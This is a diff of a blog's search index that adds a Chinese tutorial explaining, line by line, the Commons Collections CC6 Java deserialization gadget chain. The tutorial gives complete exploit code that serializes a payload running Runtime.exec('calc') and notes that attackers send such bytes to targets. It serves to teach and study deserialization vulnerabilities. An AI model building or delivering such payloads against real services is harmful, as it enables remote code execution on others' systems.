         <category>XSS</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CC6</title>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/CC6%E9%93%BE/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="CC6-完整逐行详解（JDK8u102-可用，这条链的触发入口：BadAttributeValueExpException-readObject-）"><a href="#CC6-完整逐行详解（JDK8u102-可用，这条链的触发入口：BadAttributeValueExpException-readObject-）" class="headerlink" title="CC6 完整逐行详解（JDK8u102 可用，这条链的触发入口：BadAttributeValueExpException.readObject()）"></a>CC6 完整逐行详解（JDK8u102 可用，这条链的触发入口：<code>BadAttributeValueExpException.readObject()</code>）</h1><p>先一句话总链路：</p>
+<blockquote>
+<p><code>readObject() → BadAttributeValueExpException.val.toString() → TiedMapEntry.toString() → LazyMap.get() → ChainedTransformer.transform() → 链式反射调用 Runtime.exec()</code></p>
+</blockquote>
+<blockquote>
+<p>CC1 的入口是 <code>AnnotationInvocationHandler.readObject()</code>，在 8u71 之后被修复；CC6 换了 JDK 自带的 <code>BadAttributeValueExpException</code> 当入口，所以 8u102 还能跑。</p>
+</blockquote>
+<hr>
+<h2 id="第一部分：import-导入（先快速回顾）"><a href="#第一部分：import-导入（先快速回顾）" class="headerlink" title="第一部分：import 导入（先快速回顾）"></a>第一部分：import 导入（先快速回顾）</h2><p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>Transformer</code>：CC 库顶层接口，只有一个方法 <code>transform(Object input)</code>，输入对象、返回处理后的对象，所有变换类都实现它。</li>
+<li><code>ChainedTransformer</code>：链式 Transformer，<strong>依次执行数组里每一个 Transformer，上一个的返回值传给下一个</strong>，CC 链核心调度器。</li>
+<li><code>ConstantTransformer</code>：不管输入是什么，永远返回你构造时传入的固定对象。</li>
+<li><code>InvokerTransformer</code>：反射调用器！接收【方法名、参数类型数组、参数值数组】，内部用反射执行方法，命令执行的核心。</li>
+<li><code>TiedMapEntry</code>：包装 Map 和 key，它的 <code>toString()</code> 方法会调用 <code>map.get(key)</code>，CC6 关键跳板。</li>
+<li><code>LazyMap</code>：装饰器包装普通 Map，**当 get 一个不存在的 key 时，自动调用绑定的 Transformer.transform ()**，这就是触发点。</li>
+</ul>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.management.BadAttributeValueExpException;</span><br></pre></td></tr></table></figure>
+
+<p>CC6 的<strong>入口类</strong>。它重写了 <code>readObject()</code>：反序列化的时候，会执行 <code>this.val.toString()</code>。</p>
+<blockquote>
+<p>重点：这个类是 JDK 自带、实现了 Serializable，8u102 没有修复这个逻辑！CC1 挂了之后，这个类成为替代入口。</p>
+</blockquote>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br></pre></td></tr></table></figure>
+
+<p>序列化工具：</p>
+<ul>
+<li><code>ByteArrayOutputStream</code>：把序列化后的二进制数据写到内存字节数组（不用落地成文件）</li>
+<li><code>ObjectOutputStream</code>：序列化对象，输出二进制</li>
+<li><code>ByteArrayInputStream</code>：从字节数组读数据</li>
+<li><code>ObjectInputStream</code>：反序列化，<code>readObject()</code> 是触发反序列化漏洞的函数</li>
+</ul>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br></pre></td></tr></table></figure>
+
+<p>Java 反射 Field，用来<strong>修改私有成员变量 val</strong>。<code>BadAttributeValueExpException</code> 的 val 是 private，不能直接赋值。</p>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br></pre></td></tr></table></figure>
+
+<p>原生 HashMap，被 LazyMap 包装的底层 map。</p>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class CC6sample &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br></pre></td></tr></table></figure>
+
+<p>主类，main 方法，所有异常直接抛出（EXP 写法，生产不能这样）</p>
+<hr>
+<h2 id="第二块：构造反射执行链（Transformer-数组）"><a href="#第二块：构造反射执行链（Transformer-数组）" class="headerlink" title="第二块：构造反射执行链（Transformer 数组）"></a>第二块：构造反射执行链（Transformer 数组）</h2><p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br></pre></td></tr></table></figure>
+
+<p>第 1 步：<code>ConstantTransformer</code>，<strong>无论传进来什么，固定返回 Runtime.class</strong></p>
+<blockquote>
+<p>目标：拿到 Runtime 这个 Class 对象，为后面 getMethod 做准备。</p>
+</blockquote>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br></pre></td></tr></table></figure>
+
+<p>第 2 步：InvokerTransformer 反射调用 <code>Runtime.class.getMethod(&quot;getRuntime&quot;)</code></p>
+<ul>
+<li>方法名：<code>getMethod</code></li>
+<li>参数类型：<code>String.class, Class[].class</code>（getMethod 需要【方法名、参数类型列表】）</li>
+<li>参数：<code>&quot;getRuntime&quot;</code>，空参数数组</li>
+</ul>
+<blockquote>
+<p>执行完得到：<code>Method getRuntime()</code> 对象（静态方法）</p>
+</blockquote>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">        new Object[]&#123;null, new Object[0]&#125;),</span><br></pre></td></tr></table></figure>
+
+<p>第 3 步：调用 <code>method.invoke(null)</code></p>
+<ul>
+<li>invoke 第一个参数是实例，静态方法填 null</li>
+<li>无参数</li>
+</ul>
+<blockquote>
+<p>执行完得到：<code>Runtime.getRuntime()</code> → Runtime 实例！</p>
+</blockquote>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                new Class[]&#123;String.class&#125;,</span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>第 4 步：调用 <code>runtime.exec(&quot;calc&quot;)</code>，弹出计算器。</p>
+<blockquote>
+<p>这一整条数组，交给 ChainedTransformer 串行跑。</p>
+</blockquote>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
+
+<p>把上面 4 步打包成链式变换：</p>
+<p>输入 → ConstantTransformer → Invoker1 → Invoker2 → Invoker3 → 命令执行。</p>
+<blockquote>
+<p>现在这个 chainedTransformer 本身不会自动跑！<strong>必须有人调用它的 transform () 才会执行</strong>。我们要找一条调用链，让反序列化流程自动走到 transform。</p>
+</blockquote>
+<hr>
+<h2 id="第三块：LazyMap-TiedMapEntry-跳板构造"><a href="#第三块：LazyMap-TiedMapEntry-跳板构造" class="headerlink" title="第三块：LazyMap + TiedMapEntry 跳板构造"></a>第三块：LazyMap + TiedMapEntry 跳板构造</h2><p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map innerMap = new HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);</span><br></pre></td></tr></table></figure>
+
+<p><code>LazyMap.decorate(原始map, 绑定的transformer)</code></p>
+<p>规则：</p>
+<p>当执行 <code>lazyMap.get(key)</code>：</p>
+<ol>
+<li>如果 key 已经在 innerMap 里面 → 直接返回 value</li>
+<li>如果 key 不存在 → 调用 <code>transformer.transform(key)</code>，把返回值 put 进 map，再返回</li>
+</ol>
+<p>我们后面就是要触发 <code>lazyMap.get(&quot;testkey&quot;)</code>，从而执行 chainedTransformer。</p>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;testkey&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>TiedMapEntry 源码关键：</p>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String toString() &#123;</span><br><span class="line">    return this.map.get(this.key).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要调用 <code>entry.toString()</code> → 自动执行 <code>lazyMap.get(&quot;testkey&quot;)</code> → 触发 transform！</p>
+<p>这是第二层跳板。</p>
+<hr>
+<h2 id="第四块：入口类-BadAttributeValueExpException-反射改-val"><a href="#第四块：入口类-BadAttributeValueExpException-反射改-val" class="headerlink" title="第四块：入口类 BadAttributeValueExpException + 反射改 val"></a>第四块：入口类 BadAttributeValueExpException + 反射改 val</h2><p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException bad = new BadAttributeValueExpException(&quot;aaa&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>先 new 一个对象，构造参数只是初始化 val 为字符串 “aaa”，后面我们要覆盖掉 val。</p>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Field valField = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);</span><br><span class="line">valField.setAccessible(true);</span><br><span class="line">valField.set(bad, entry);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>val</code> 是 BadAttributeValueExpException 的私有成员变量</li>
+<li><code>setAccessible(true)</code>：关闭权限检查，暴力读写 private 字段</li>
+<li><code>valField.set(bad, entry)</code>：把 <code>bad.val</code> 从原来的字符串，替换成我们造好的 <code>TiedMapEntry</code> 对象！</li>
+</ul>
+<p>👉 现在 <code>bad.val = TiedMapEntry(lazyMap, &quot;testkey&quot;)</code></p>
+<p>看 <code>BadAttributeValueExpException.readObject()</code> 原生逻辑：</p>
+<p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line">    val.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>反序列化的时候，自动执行 val.toString ()！</strong></p>
+<p>这就是 CC6 整条链的启动开关！</p>
+<p>链路串起来：</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ois.readObject()</span><br><span class="line">→ BadAttributeValueExpException.readObject()</span><br><span class="line">→ val.toString()  // val是TiedMapEntry</span><br><span class="line">→ TiedMapEntry.toString()</span><br><span class="line">→ lazyMap.get(&quot;testkey&quot;)</span><br><span class="line">→ LazyMap里面没有testkey，执行 chainedTransformer.transform(key)</span><br><span class="line">→ 链式Transformer依次执行</span><br><span class="line">→ Runtime.exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="第五块：序列化（生成-payload）"><a href="#第五块：序列化（生成-payload）" class="headerlink" title="第五块：序列化（生成 payload）"></a>第五块：序列化（生成 payload）</h2><p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream oos = new ObjectOutputStream(bos);</span><br><span class="line">oos.writeObject(bad);</span><br><span class="line">oos.close();</span><br><span class="line">byte[] payload = bos.toByteArray();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>oos.writeObject(bad)</code>：把我们精心构造好的 <code>BadAttributeValueExpException</code> 对象序列化为二进制</li>
+<li>二进制存在内存字节数组 payload 里</li>
+</ul>
+<blockquote>
+<p>真实攻击场景：这个 payload 字节流发给目标，目标那边调用 <code>ObjectInputStream.readObject()</code>，就触发。本地代码这里只是把【生成 payload】和【本地反序列化测试】写在一起了。</p>
+</blockquote>
+<hr>
+<h2 id="第六块：本地测试：反序列化触发"><a href="#第六块：本地测试：反序列化触发" class="headerlink" title="第六块：本地测试：反序列化触发"></a>第六块：本地测试：反序列化触发</h2><p>java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ByteArrayInputStream bis = new ByteArrayInputStream(payload);</span><br><span class="line">ObjectInputStream ois = new ObjectInputStream(bis);</span><br><span class="line">ois.readObject();</span><br><span class="line">ois.close();</span><br></pre></td></tr></table></figure>
+
+<p><code>ois.readObject()</code> 是触发器！</p>
+<p>读到对象 → 调用 BadAttributeValueExpException 的 readObject 方法 → 整条链跑起来，弹出 calc。</p>
+<hr>
+<h1 id="重要坑点总结（手写-CC6-必记）"><a href="#重要坑点总结（手写-CC6-必记）" class="headerlink" title="重要坑点总结（手写 CC6 必记）"></a>重要坑点总结（手写 CC6 必记）</h1><ol>
+<li><p>为什么 CC1 不能在 8u102 跑、CC6 可以？</p>
+<p> CC1 入口：<code>AnnotationInvocationHandler.readObject()</code>，8u71 修改了逻辑，不再调用 memberValue.toString ()；</p>
+<p> CC6 入口：<code>BadAttributeValueExpException.readObject()</code>，8u102 还保留 <code>val.toString()</code>。</p>
+</li>
+<li><p>LazyMap 是 get 不存在 key 才触发；</p>
+</li>
+<li><p>TiedMapEntry 的核心是 toString 调用 map.get；</p>
+</li>
+<li><p>必须反射修改 BadAttributeValueExpException 的私有 val 字段；</p>
+</li>
+<li><p>整条链所有类都要实现 Serializable（CC 库这几个类都已经序列化好了，不用自己写）</p>
+</li>
+</ol>
+<h1 id="默写顺序（你自己手写推荐这个顺序）"><a href="#默写顺序（你自己手写推荐这个顺序）" class="headerlink" title="默写顺序（你自己手写推荐这个顺序）"></a>默写顺序（你自己手写推荐这个顺序）</h1><ol>
+<li>导入包</li>
+<li>写 Transformer 数组（Constant + 三段 Invoker）</li>
+<li>ChainedTransformer 组装</li>
+<li>LazyMap.decorate</li>
+<li>TiedMapEntry 封装 map+key</li>
+<li>new BadAttributeValueExpException，反射修改 val</li>
+<li>序列化代码</li>
+<li>反序列化测试代码</li>
+</ol>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>JAVA安全</category>
+        <category>反序列化</category>
+        <category>CC链</category>
       </categories>
   </entry>
 </search>
